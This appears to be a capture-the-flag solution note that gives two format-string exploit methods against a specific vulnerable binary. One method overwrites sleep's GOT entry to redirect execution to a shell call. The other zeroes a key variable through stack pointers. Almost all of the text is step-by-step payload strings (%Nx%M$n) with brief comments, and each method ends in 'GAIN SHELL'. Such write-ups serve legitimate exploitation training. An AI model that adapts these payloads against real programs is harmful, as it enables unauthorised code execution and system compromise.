Two methods

## Method 1 (faster): redirect code execution with GOT override:
# Step 1: override the 20th stack value to sleep's GOT entry with the 14th stack value which is pointing to the 20th
%134520840x%14$n
# Step 2: override the GOT entry with the address after the if check for the key (where the call to sh is)
%134514333x%20$n
# Step 3: re-override the 20th stack value to the address of buf[] because for some reason the 4th printf in the loop writes to the address in the 20th stack value, so we write buf[]'s adress because it is harmless to write junk there
%134513664x%14$n
# Step 4: send junk just to pass the 4th printf
a
# GAIN SHELL

## Method 2: override key's value with 0
# Step 1: override the 20th stack value to a pointer to the first 4 bytes of key with the 14th stack value which is pointing to the 20th
%134520928x%14$n
# Step 2: override the 21th stack value to a pointer to the second 4 bytes of key with the 15th stack value which is pointing to the 21th
%134520932x%15$n
# Step 3: override key with 0
%20$n%21$n
# Step 4: re-override the 20th stack value to the address of buf[] because for some reason the 4th printf in the loop writes to the address in the 20th stack value, so we write buf[]'s adress because it is harmless to write junk there
%134513664x%14$n
# GAIN SHELL
